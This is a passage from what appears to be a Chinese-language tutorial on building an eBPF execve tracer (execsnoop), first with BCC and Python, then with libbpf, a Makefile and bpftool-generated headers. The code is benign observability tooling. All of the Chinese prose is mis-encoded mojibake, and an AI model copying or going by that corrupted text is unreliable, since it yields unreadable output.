*data, <span class="type">const</span> <span class="type">char</span> *ptr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (data-&gt;args_size &gt; LAST_ARG) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ret = bpf_probe_read_user_str(&amp;data-&gt;argv[data-&gt;args_size], ARGSIZE,</span><br><span class="line">  (<span class="type">void</span> *)ptr);</span><br><span class="line"><span class="keyword">if</span> (ret &gt; ARGSIZE || ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// increase the args size. the first tailing &#x27;\0&#x27; is not counted and hence it</span></span><br><span class="line"><span class="comment">// would be overwritten by the next call.</span></span><br><span class="line">data-&gt;args_size += (ret - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sys_enter_execve tracepoint.</span></span><br><span class="line">TRACEPOINT_PROBE(syscalls, sys_enter_execve)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// variables definitions</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> **argv = (<span class="type">const</span> <span class="type">char</span> **)(args-&gt;argv);</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the pid and comm</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> <span class="title">data</span> =</span> &#123; &#125;;</span><br><span class="line">u32 pid = bpf_get_current_pid_tgid();</span><br><span class="line">data.pid = pid;</span><br><span class="line">bpf_get_current_comm(&amp;data.comm, <span class="keyword">sizeof</span>(data.comm));</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the binary name (first argment)</span></span><br><span class="line"><span class="keyword">if</span> (__bpf_read_arg_str(&amp;data, (<span class="type">const</span> <span class="type">char</span> *)argv[<span class="number">0</span>]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// get other arguments (skip first arg because it has already been read)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unroll</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; TOTAL_MAX_ARGS; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (__bpf_read_arg_str(&amp;data, (<span class="type">const</span> <span class="type">char</span> *)argv[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line"><span class="comment">// store the data in hash map</span></span><br><span class="line">tasks.update(&amp;pid, &amp;data);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sys_exit_execve tracepoint</span></span><br><span class="line">TRACEPOINT_PROBE(syscalls, sys_exit_execve)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// query the data from hash map</span></span><br><span class="line">u32 pid = bpf_get_current_pid_tgid();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> *<span class="title">data</span> =</span> tasks.lookup(&amp;pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">// submit perf events after getting the retval</span></span><br><span class="line"><span class="keyword">if</span> (data != <span class="literal">NULL</span>) &#123;</span><br><span class="line">data-&gt;retval = args-&gt;ret;</span><br><span class="line">events.perf_submit(args, data, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> <span class="type">data_t</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// clean up the hash map</span></span><br><span class="line">tasks.delete(&amp;pid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Python-å‰ç«¯å¤„ç†"><a href="#Python-å‰ç«¯å¤„ç†" class="headerlink" title="Python å‰ç«¯å¤„ç†"></a>Python å‰ç«¯å¤„ç†</h3><p>eBPF ç¨‹åºå¼€å‘å®Œæˆåï¼Œæœ€åä¸€æ­¥å°±æ˜¯ä¸ºå®ƒå¢åŠ ä¸€ä¸ª Python å‰ç«¯ã€‚</p><p>åŒä¹‹å‰å†™çš„ Hello World ç±»ä¼¼ï¼Œ<strong>Python å‰ç«¯é€»è¾‘éœ€è¦ eBPF ç¨‹åºåŠ è½½ã€æŒ‚è½½åˆ°å†…æ ¸å‡½æ•°å’Œè·Ÿè¸ªç‚¹ï¼Œä»¥åŠé€šè¿‡ BPF æ˜ å°„è·å–å’Œæ‰“å°æ‰§è¡Œç»“æœç­‰å‡ ä¸ªæ­¥éª¤</strong>ã€‚å…¶ä¸­ï¼Œå› ä¸ºæˆ‘ä»¬å·²ç»ä½¿ç”¨äº† <code>TRACEPOINT_PROBE</code>Â å®å®šä¹‰ï¼Œæ¥å®šä¹‰ eBPF è·Ÿè¸ªç‚¹å¤„ç†å‡½æ•°ï¼ŒBCC åœ¨åŠ è½½å­—èŠ‚ç çš„æ—¶å€™ï¼Œä¼šå¸®ä½ è‡ªåŠ¨æŠŠå®ƒæŒ‚è½½åˆ°æ­£ç¡®çš„è·Ÿè¸ªç‚¹ä¸Šï¼Œæ‰€ä»¥æŒ‚è½½çš„æ­¥éª¤å°±å¯ä»¥å¿½ç•¥ã€‚å®Œæ•´çš„ Python ç¨‹åºå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¼•å…¥åº“å‡½æ•°</span></span><br><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"><span class="keyword">from</span> bcc.utils <span class="keyword">import</span> printb</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1) åŠ è½½eBPFä»£ç </span></span><br><span class="line">b = BPF(src_file=<span class="string">&quot;execsnoop.c&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) è¾“å‡ºå¤´</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%-6s %-16s %-3s %s&quot;</span> % (<span class="string">&quot;PID&quot;</span>, <span class="string">&quot;COMM&quot;</span>, <span class="string">&quot;RET&quot;</span>, <span class="string">&quot;ARGS&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3) å®šä¹‰æ€§èƒ½äº‹ä»¶æ‰“å°å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_event</span>(<span class="params">cpu, data, size</span>):</span><br><span class="line">    <span class="comment"># BCCè‡ªåŠ¨æ ¹æ®&quot;struct data_t&quot;ç”Ÿæˆæ•°æ®ç»“æ„</span></span><br><span class="line">    event = b[<span class="string">&quot;events&quot;</span>].event(data)</span><br><span class="line">    printb(<span class="string">b&quot;%-6d %-16s %-3d %-16s&quot;</span> % (event.pid, event.comm, event.retval, event.argv))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4) ç»‘å®šæ€§èƒ½äº‹ä»¶æ˜ å°„å’Œè¾“å‡ºå‡½æ•°ï¼Œå¹¶ä»æ˜ å°„ä¸­å¾ªç¯è¯»å–æ•°æ®</span></span><br><span class="line">b[<span class="string">&quot;events&quot;</span>].open_perf_buffer(print_event)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        b.perf_buffer_poll()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>æŠŠä¸Šè¿°çš„ä»£ç ä¿å­˜åˆ° Â execsnoop.pyÂ  ä¸­ï¼Œç„¶åé€šè¿‡ Python è¿è¡Œï¼Œå¹¶åœ¨å¦ä¸€ä¸ªç»ˆç«¯ä¸­æ‰§è¡Œ Â lsÂ  å‘½ä»¤ï¼Œä½ å°±å¯ä»¥å¾—åˆ°å¦‚ä¸‹çš„è¾“å‡ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python3 execsnoop.py</span><br><span class="line">PID    COMM             RET ARGS</span><br><span class="line">1311958 barad_agent      0   /bin/sh-ccat /proc/meminfo |grep <span class="string">&#x27;HardwareCorrupted&#x27;</span> |awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span></span><br><span class="line">1311959 sh               0   <span class="built_in">cat</span>/proc/meminfo</span><br><span class="line">1311960 sh               0   grepHardwareCorrupted</span><br><span class="line">1311961 sh               0   awk&#123;<span class="built_in">print</span> <span class="variable">$2</span>&#125;</span><br></pre></td></tr></table></figure><p>åˆ°æ­¤å¤„ï¼Œæˆ‘ä»¬å°±å¼€å‘äº†ä¸€ä¸ªæ–°çš„ eBPF ç¨‹åºï¼Œå®ƒçš„ä½œç”¨ä¹Ÿæ˜¯æ’æŸ¥çŸ­æ—¶è¿›ç¨‹ç›¸å…³çš„æ€§èƒ½ã€‚</p><p>ä¸è¿‡ï¼Œåœ¨ä½ æƒ³è¦åˆ†å‘è¿™ä¸ªç¨‹åºåˆ°ç”Ÿäº§ç¯å¢ƒæ—¶ï¼Œåˆä¼šç¢°åˆ°ä¸€ä¸ªæ–°çš„éš¾é¢˜ï¼šBCC ä¾èµ–äº LLVM å’Œå†…æ ¸å¤´æ–‡ä»¶æ‰å¯ä»¥åŠ¨æ€ç¼–è¯‘å’ŒåŠ è½½ eBPF ç¨‹åºï¼Œè€Œå‡ºäºå®‰å…¨ç­–ç•¥çš„éœ€è¦ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­é€šå¸¸åˆä¸å…è®¸å®‰è£…è¿™äº›å¼€å‘å·¥å…·ã€‚</p><p>è¿™ä¸ªéš¾é¢˜åº”è¯¥æ€ä¹ˆå…‹æœå‘¢ï¼Ÿä¸€ç§å¾ˆå®¹æ˜“æƒ³åˆ°çš„æ–¹æ³•æ˜¯æŠŠ BCC å’Œå¼€å‘å·¥å…·éƒ½å®‰è£…åˆ°å®¹å™¨ä¸­ï¼Œå®¹å™¨æœ¬èº«ä¸æä¾›å¯¹å¤–æœåŠ¡ï¼Œè¿™æ ·å¯ä»¥é™ä½å®‰å…¨é£é™©ã€‚å¦å¤–ä¸€ç§æ–¹æ³•å°±æ˜¯å‚è€ƒå†…æ ¸ä¸­çš„ <a class="link" href="https://elixir.bootlin.com/linux/v5.13/source/samples/bpf">eBPF ç¤ºä¾‹<i class="fas fa-external-link-alt"></i></a>ï¼Œå¼€å‘ä¸€ä¸ªåŒ¹é…å½“å‰å†…æ ¸ç‰ˆæœ¬çš„ eBPF ç¨‹åºï¼Œå¹¶ç¼–è¯‘ä¸ºå­—èŠ‚ç ï¼Œå†åˆ†å‘åˆ°ç”Ÿäº§ç¯å¢ƒä¸­ã€‚</p><p>é™¤æ­¤ä¹‹å¤–ï¼Œå¦‚æœä½ çš„å†…æ ¸å·²ç»æ”¯æŒäº† BPF ç±»å‹æ ¼å¼ (BTF)ï¼Œæˆ‘æ¨èä½ ä½¿ç”¨ä»å†…æ ¸æºç ä¸­æŠ½ç¦»å‡ºæ¥çš„ libbpf è¿›è¡Œå¼€å‘ï¼Œè¿™æ ·å¯ä»¥å€ŸåŠ© BTF å’Œ CO-RE è·å¾—æ›´å¥½çš„ç§»æ¤æ€§ã€‚å®é™…ä¸Šï¼ŒBCC çš„å¾ˆå¤šå·¥å…·éƒ½åœ¨å‘ BTF è¿ç§»ä¸­ï¼Œç›¸ä¿¡æœªæ¥ libbpf ä¼šæˆä¸ºæœ€å—æ¬¢è¿çš„ eBPF ç¨‹åºå¼€å‘åŸºç¡€åº“ï¼Œç”šè‡³ Windows eBPF ä¹Ÿä¼šæ”¯æŒ libbpfã€‚</p><h2 id="libbpf-å¼€å‘å†…æ ¸è¿½è¸ªç¨‹åº"><a href="#libbpf-å¼€å‘å†…æ ¸è¿½è¸ªç¨‹åº" class="headerlink" title="libbpf å¼€å‘å†…æ ¸è¿½è¸ªç¨‹åº"></a>libbpf å¼€å‘å†…æ ¸è¿½è¸ªç¨‹åº</h2><h3 id="libbpf-æ–¹æ³•"><a href="#libbpf-æ–¹æ³•" class="headerlink" title="libbpf æ–¹æ³•"></a>libbpf æ–¹æ³•</h3><p>é‚£ä¹ˆï¼Œå¦‚ä½•ç”¨ libbpf æ¥å¼€å‘ä¸€ä¸ª eBPF ç¨‹åºå‘¢ï¼Ÿè·Ÿåˆšæ‰çš„ BCC ç¨‹åºç±»ä¼¼ï¼Œä½¿ç”¨ libbpf å¼€å‘ eBPF ç¨‹åºä¹Ÿæ˜¯åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š</p><ul><li>ç¬¬ä¸€ï¼Œå†…æ ¸æ€çš„ eBPF ç¨‹åºï¼›</li><li>ç¬¬äºŒï¼Œç”¨æˆ·æ€çš„åŠ è½½ã€æŒ‚è½½ã€æ˜ å°„è¯»å–ä»¥åŠè¾“å‡ºç¨‹åºç­‰ã€‚</li></ul><p><strong>åœ¨ eBPF ç¨‹åºä¸­ï¼Œç”±äºå†…æ ¸å·²ç»æ”¯æŒäº† BTFï¼Œä½ ä¸å†éœ€è¦å¼•å…¥ä¼—å¤šçš„å†…æ ¸å¤´æ–‡ä»¶æ¥è·å–å†…æ ¸æ•°æ®ç»“æ„çš„å®šä¹‰</strong>ã€‚å–è€Œä»£ä¹‹çš„æ˜¯ä¸€ä¸ªé€šè¿‡ bpftool ç”Ÿæˆçš„Â <code>vmlinux.h</code>Â  å¤´æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«äº†å†…æ ¸æ•°æ®ç»“æ„çš„å®šä¹‰ã€‚</p><p>è¿™æ ·ï¼Œä½¿ç”¨ libbpf å¼€å‘ eBPF ç¨‹åºå°±å¯ä»¥é€šè¿‡ä»¥ä¸‹å››ä¸ªæ­¥éª¤å®Œæˆï¼š</p><ol><li>ä½¿ç”¨ bpftool ç”Ÿæˆå†…æ ¸æ•°æ®ç»“æ„å®šä¹‰å¤´æ–‡ä»¶ã€‚BTF å¼€å¯åï¼Œä½ å¯ä»¥åœ¨ç³»ç»Ÿä¸­æ‰¾åˆ° Â <code>/sys/kernel/btf/vmlinux</code>Â  è¿™ä¸ªæ–‡ä»¶ï¼Œbpftool æ­£æ˜¯ä»å®ƒç”Ÿæˆäº†å†…æ ¸æ•°æ®ç»“æ„å¤´æ–‡ä»¶ã€‚</li><li>å¼€å‘ eBPF ç¨‹åºéƒ¨åˆ†ã€‚ä¸ºäº†æ–¹ä¾¿åç»­é€šè¿‡ç»Ÿä¸€çš„ Makefile ç¼–è¯‘ï¼ŒeBPF ç¨‹åºçš„æºç æ–‡ä»¶ä¸€èˆ¬å‘½åä¸º Â <code>&lt;ç¨‹åºå&gt;.bpf.c</code>ã€‚</li><li>ç¼–è¯‘ eBPF ç¨‹åºä¸ºå­—èŠ‚ç ï¼Œç„¶åå†è°ƒç”¨ <code>bpftool gen skeleton</code> ä¸º eBPF å­—èŠ‚ç ç”Ÿæˆè„šæ‰‹æ¶å¤´æ–‡ä»¶ï¼ˆSkeleton Headerï¼‰ã€‚è¿™ä¸ªå¤´æ–‡ä»¶åŒ…å«äº† eBPF å­—èŠ‚ç ä»¥åŠç›¸å…³çš„åŠ è½½ã€æŒ‚è½½å’Œå¸è½½å‡½æ•°ï¼Œå¯åœ¨ç”¨æˆ·æ€ç¨‹åºä¸­ç›´æ¥è°ƒç”¨ã€‚</li><li>æœ€åå°±æ˜¯ç”¨æˆ·æ€ç¨‹åºå¼•å…¥ä¸Šä¸€æ­¥ç”Ÿæˆçš„å¤´æ–‡ä»¶ï¼Œå¼€å‘ç”¨æˆ·æ€ç¨‹åºï¼ŒåŒ…æ‹¬ eBPF ç¨‹åºåŠ è½½ã€æŒ‚è½½åˆ°å†…æ ¸å‡½æ•°å’Œè·Ÿè¸ªç‚¹ï¼Œä»¥åŠé€šè¿‡ BPF æ˜ å°„è·å–å’Œæ‰“å°æ‰§è¡Œç»“æœç­‰ã€‚</li></ol><p>é€šå¸¸ï¼Œè¿™å‡ ä¸ªæ­¥éª¤é‡Œé¢çš„ç¼–è¯‘ã€åº“é“¾æ¥ã€æ‰§è¡ŒÂ <code>bpftool</code>Â  å‘½ä»¤ç­‰ï¼Œéƒ½å¯ä»¥æ”¾åˆ° Makefile ä¸­ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡ä¸€ä¸ª <code>make</code> å‘½ä»¤å»æ‰§è¡Œæ‰€æœ‰çš„æ­¥éª¤ã€‚æ¯”å¦‚ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªç®€åŒ–ç‰ˆæœ¬çš„ Makefileï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">APPS = execsnoop</span><br><span class="line"></span><br><span class="line">.PHONY: all</span><br><span class="line">all: $(APPS)</span><br><span class="line"></span><br><span class="line">$(APPS):</span><br><span class="line">    clang -g -O2 -target bpf -D__TARGET_ARCH_x86_64 -I/usr/include/x86_64-linux-gnu -I. -c $@.bpf.c -o $@.bpf.o</span><br><span class="line">    bpftool gen skeleton $@.bpf.o &gt; $@.skel.h</span><br><span class="line">    clang -g -O2 -Wall -I . -c $@.c -o $@.o</span><br><span class="line">    clang -Wall -O2 -g $@.o -<span class="type">static</span> -lbpf -lelf -lz -o $@</span><br><span class="line"></span><br><span class="line">vmlinux:</span><br><span class="line">    $(bpftool) btf dump file /sys/kernel/btf/vmlinux format c &gt; vmlinux.h</span><br></pre></td></tr></table></figure><p>æœ‰äº†è¿™ä¸ª Makefile ä¹‹åï¼Œä½ æ‰§è¡Œ <code>make vmlinux</code> å‘½ä»¤å°±å¯ä»¥ç”Ÿæˆ <code>vmlinux.h</code> æ–‡ä»¶ï¼Œå†æ‰§è¡ŒÂ <code>make</code> å°±å¯ä»¥ç¼–è¯‘ Â <code>APPS</code> é‡Œé¢é…ç½®çš„æ‰€æœ‰ eBPF ç¨‹åºï¼ˆå¤šä¸ªç¨‹åºä¹‹é—´ä»¥ç©ºæ ¼åˆ†éš”ï¼‰ã€‚</p><h3 id="å†…æ ¸å¤´æ–‡ä»¶ç”Ÿæˆ"><a href="#å†…æ ¸å¤´æ–‡ä»¶ç”Ÿæˆ" class="headerlink" title="å†…æ ¸å¤´æ–‡ä»¶ç”Ÿæˆ"></a>å†…æ ¸å¤´æ–‡ä»¶ç”Ÿæˆ</h3><p>é¦–å…ˆï¼Œå¯¹äºç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬åªéœ€è¦æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œå³å¯ç”Ÿæˆå†…æ ¸æ•°æ®ç»“æ„çš„å¤´æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bpftool btf dump file /sys/kernel/btf/vmlinux format c &gt; vmlinux.h</span><br></pre></td></tr></table></figure><p>å¦‚æœå‘½ä»¤æ‰§è¡Œå¤±è´¥äº†ï¼Œå¹¶ä¸”é”™è¯¯è¯´ BTF ä¸å­˜åœ¨ï¼Œé‚£è¯´æ˜å½“å‰ç³»ç»Ÿå†…æ ¸æ²¡æœ‰å¼€å¯ BTF ç‰¹æ€§ã€‚è¿™æ—¶å€™ï¼Œä½ éœ€è¦å¼€å¯ <code>CONFIG_DEBUG_INFO_BTF=y</code>Â å’Œ <code>CONFIG_DEBUG_INFO=y</code> è¿™ä¸¤ä¸ªç¼–è¯‘é€‰é¡¹ï¼Œç„¶åé‡æ–°ç¼–è¯‘å’Œå®‰è£…å†…æ ¸ã€‚</p><h3 id="eBPF-ç¨‹åºå®šä¹‰"><a href="#eBPF-ç¨‹åºå®šä¹‰" class="headerlink" title="eBPF ç¨‹åºå®šä¹‰"></a>eBPF ç¨‹åºå®šä¹‰</h3><p>ç¬¬äºŒæ­¥å°±æ˜¯å¼€å‘ eBPF ç¨‹åºï¼ŒåŒ…æ‹¬å®šä¹‰å“ˆå¸Œæ˜ å°„ã€æ€§èƒ½äº‹ä»¶æ˜ å°„ä»¥åŠè·Ÿè¸ªç‚¹çš„å¤„ç†å‡½æ•°ç­‰ï¼Œè€Œå¯¹è¿™äº›æ•°æ®ç»“æ„å’Œè·Ÿè¸ªå‡½æ•°çš„å®šä¹‰éƒ½å¯ä»¥é€šè¿‡ <code>SEC()</code> å®å®šä¹‰æ¥å®Œæˆã€‚åœ¨ç¼–è¯‘æ—¶ï¼Œ<strong>é€šè¿‡ <code>SEC()</code> å®å®šä¹‰çš„æ•°æ®ç»“æ„å’Œå‡½æ•°ä¼šæ”¾åˆ°ç‰¹å®šçš„ ELF æ®µä¸­ï¼Œè¿™æ ·åç»­åœ¨åŠ è½½ BPF å­—èŠ‚ç æ—¶ï¼Œå°±å¯ä»¥ä»è¿™äº›æ®µä¸­è·å–æ‰€éœ€çš„å…ƒæ•°æ®</strong>ã€‚</p><p>æ¯”å¦‚ï¼Œä½ å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ä»£ç æ¥å®šä¹‰æ˜ å°„å’Œè·Ÿè¸ªç‚¹å¤„ç†å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åŒ…å«å¤´æ–‡ä»¶</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmlinux.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bpf/bpf_helpers.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰è¿›ç¨‹åŸºæœ¬ä¿¡æ¯æ•°æ®ç»“æ„</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> comm[TASK_COMM_LEN];</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    <span class="type">int</span> args_count;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> args_size;</span><br><span class="line">    <span class="type">char</span> args[FULL_MAX_ARGS_ARR];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰å“ˆå¸Œæ˜ å°„</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    __uint(type, BPF_MAP_TYPE_HASH);</span><br><span class="line">    __uint(max_entries, <span class="number">10240</span>);</span><br><span class="line">    __type(key, <span class="type">pid_t</span>);</span><br><span class="line">    __type(value, <span class="keyword">struct</span> event);</span><br><span class="line">&#125; execs <span class="title function_">SEC</span><span class="params">(<span class="string">&quot;.maps&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰æ€§èƒ½äº‹ä»¶æ˜ å°„</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);</span><br><span class="line">    __uint(key_size, <span class="keyword">sizeof</span>(u32));</span><br><span class="line">    __uint(value_size, <span class="keyword">sizeof</span>(u32));</span><br><span class="line">&#125; events <span class="title function_">SEC</span><span class="params">(<span class="string">&quot;.maps&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sys_enter_execveè·Ÿè¸ªç‚¹</span></span><br><span class="line">SEC(<span class="string">&quot;tracepoint/syscalls/sys_enter_execve&quot;</span>)</span><br><span class="line"><span class="type">int</span> <span class="title function_">tracepoint__syscalls__sys_enter_execve</span><span class="params">(<span class="keyword">struct</span> trace_event_raw_sys_enter *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// å¾…å®ç°å¤„ç†é€»è¾‘</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sys_exit_execveè·Ÿè¸ªç‚¹</span></span><br><span class="line">SEC(<span class="string">&quot;tracepoint/syscalls/sys_exit_execve&quot;</span>)</span><br><span class="line"><span class="type">int</span> <span class="title function_">tracepoint__syscalls__sys_exit_execve</span><span class="params">(<span class="keyword">struct</span> trace_event_raw_sys_exit *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// å¾…å®ç°å¤„ç†é€»è¾‘</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰è®¸å¯è¯ï¼ˆå‰è¿°çš„BCCé»˜è®¤ä½¿ç”¨GPLï¼‰</span></span><br><span class="line"><span class="type">char</span> LICENSE[] SEC(<span class="string">&quot;license&quot;</span>) = <span class="string">&quot;Dual BSD/GPL&quot;</span>;</span><br></pre></td></tr></table></figure><p>è®©æˆ‘ä»¬æ¥çœ‹çœ‹è¿™æ®µä»£ç çš„å…·ä½“å«ä¹‰ï¼š</p><ul><li>å¤´æ–‡ä»¶ <code>vmlinux.h</code> åŒ…å«äº†å†…æ ¸æ•°æ®ç»“æ„ï¼Œè€Œ <code>bpf/bpf_helpers.h</code> åŒ…å«äº†ä¹‹å‰æåˆ°çš„ BPF è¾…åŠ©å‡½æ•°ï¼›</li><li><code>struct event</code> å®šä¹‰äº†è¿›ç¨‹åŸºæœ¬ä¿¡æ¯æ•°æ®ç»“æ„ï¼Œå®ƒä¼šç”¨åœ¨åé¢çš„å“ˆå¸Œæ˜ å°„ä¸­ï¼›</li><li><code>SEC(&quot;.maps&quot;)</code> å®šä¹‰äº†å“ˆå¸Œæ˜ å°„å’Œæ€§èƒ½äº‹ä»¶æ˜ å°„ï¼›</li><li><code>SEC(&quot;tracepoint/&lt;è·Ÿè¸ªç‚¹åç§°&gt;&quot;)</code> å®šä¹‰äº†è·Ÿè¸ªç‚¹å¤„ç†å‡½æ•°ï¼Œç³»ç»Ÿè°ƒç”¨è·Ÿè¸ªç‚¹çš„æ ¼å¼æ˜¯ Â <code>tracepoint/syscalls/&lt;ç³»ç»Ÿè°ƒç”¨åç§°&gt;&quot;</code>ã€‚ä»¥åä½ éœ€è¦å®šä¹‰å†…æ ¸æ’æ¡©å’Œç”¨æˆ·æ’æ¡©çš„æ—¶å€™ï¼Œä¹Ÿæ˜¯ä»¥ç±»ä¼¼çš„æ ¼å¼å®šä¹‰ï¼Œæ¯”å¦‚ <code>kprobe/do_unlinkat</code>Â  æˆ– Â <code>uprobe/func</code>ï¼›</li><li>æœ€åçš„ Â <code>SEC(&quot;license&quot;)</code>Â  å®šä¹‰äº† eBPF ç¨‹åºçš„è®¸å¯è¯ã€‚åœ¨ä¸Šè¿°çš„ BCC eBPF ç¨‹åºä¸­ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰å®šä¹‰è®¸å¯è¯ï¼Œè¿™æ˜¯å› ä¸º BCC è‡ªåŠ¨å¸®ä½ ä½¿ç”¨äº† GPL è®¸å¯ã€‚</li></ul><p>æœ‰äº†åŸºæœ¬çš„ç¨‹åºç»“æ„ï¼Œæ¥ä¸‹æ¥å°±æ˜¯<strong>å®ç°ç³»ç»Ÿè°ƒç”¨å…¥å£å’Œå‡ºå£è·Ÿè¸ªç‚¹çš„å¤„ç†å‡½æ•°</strong>ã€‚å®ƒä»¬çš„åŸºæœ¬è¿‡ç¨‹è·Ÿä¸Šè¿°çš„ BCC ç¨‹åºæ˜¯ç±»ä¼¼çš„ã€‚</p><h3 